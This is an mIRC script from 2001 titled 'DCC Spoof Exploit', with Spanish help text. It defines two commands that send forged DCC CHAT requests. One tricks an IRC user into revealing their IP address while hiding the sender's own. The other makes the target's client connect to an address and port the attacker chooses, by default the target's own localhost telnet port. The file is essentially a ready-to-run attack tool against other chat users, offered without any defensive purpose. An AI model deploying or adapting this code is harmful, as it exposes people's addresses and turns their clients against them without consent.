#_.INFO off

/********************************************************************
*                         DCC Spoof Exploit                         *
*                             LZ 2001                               *
********************************************************************/

/********************************************************************
*                                                                   *
* /dccspoof1 | DCC IP Spoof, extract somebody else IP without       *
*            | letting him knows yours, or make it look like you    *
*            | have a different IP.                                 *
*                                                                   *
* /dccspoof2 | DCC IP Spoof, make someone connect to the IP and     *
*            | port you desire                                      *
*                                                                   *
*   Type them without parameters to see the help.                   *
*                                                                   *
********************************************************************/

#_.INFO end

alias -l _¶c return $colour(info)
alias -l _¶d _¶f $_¶c -s *§* Sintaxis: <nick> [ip puerto] | _¶f $_¶c -s *§* Donde IP y puerto falsos son opcionales. (Por defecto: 31.3.3.7 1337)
alias -l _¶e _¶f $_¶c -s *§* Sintaxis: <nick> [ip puerto] | _¶f $_¶c -s *§* Donde IP y puerto es donde conectará. (Por defecto: 127.0.0.1 23)
alias -l _¶f if ($chan($active)) || ($query($active)) echo $1 -a $2- | echo $1 -s $2-
alias dccspoof1 {
  if ($1 = $null) { _¶d | return }
  if ($2 = $null) var %_¶i 31.3.3.7
  elseif ($longip($2) = $null)  { _¶d | return }
  else var %_¶i $2
  if ($3 = $null) var %_¶p 1337
  elseif ($3 !isnum)  { _¶d | return }
  else var %_¶p $3
  .notice $1 DCC Chat ( $+ %_¶i $+ )
  .quote PRIVMSG $1 :DCC CHAT chat $longip(%_¶i) chat $longip(%_¶i) %_¶p chat 0
  if ($show) {
    echo $_¶c -a *§* Enviando Exploit DCC a $1 $+ .
    echo $_¶c -a *§* En caso de que lo acepte, obtendrá su IP.
    echo $_¶c -a *§* Si usted acepta también, hará spoof.
  }
}
alias dccspoof2 {
  if ($1 = $null) { _¶e | return }
  if ($2 = $null) var %_¶i 127.0.0.1
  elseif ($longip($2) = $null) { _¶e | return }
  else var %_¶i $2
  if ($3 = $null) var %_¶p 23
  elseif ($3 !isnum) { _¶e | return }
  else var %_¶p $3
  .notice $1 DCC Chat ( $+ %_¶i $+ )
  .quote PRIVMSG $1 :DCC CHAT chat $longip(%_¶i) %_¶p $+ 
  if ($show) echo $_¶c -a *§* Enviado fake DCC a $1 $+ . ( $+ %_¶i $+ : $+ %_¶p $+ )
}
/*EOF*/
